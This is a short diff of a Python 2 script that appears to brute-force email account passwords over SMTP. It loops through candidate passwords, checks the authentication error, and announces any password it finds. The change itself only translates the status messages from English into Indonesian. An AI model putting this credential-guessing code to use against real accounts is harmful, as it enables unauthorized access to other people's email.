@@ -40,16 +40,16 @@ def login():
          system('clear')
          main()
          print '\n'
-         print '[+] Account password found :' + password + '     ^_^'
+         print '[+] Password akun ditemukan :' + password + '     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] Account password found :' + password + '     ^_^'
+            print '[+] Password akun ditemukan :' + password + '     ^_^'
 
             break
          else:
-            print '[!]  Password search...  => ' + password
+            print '[!]  Password yang dicoba...  => ' + password
 login()
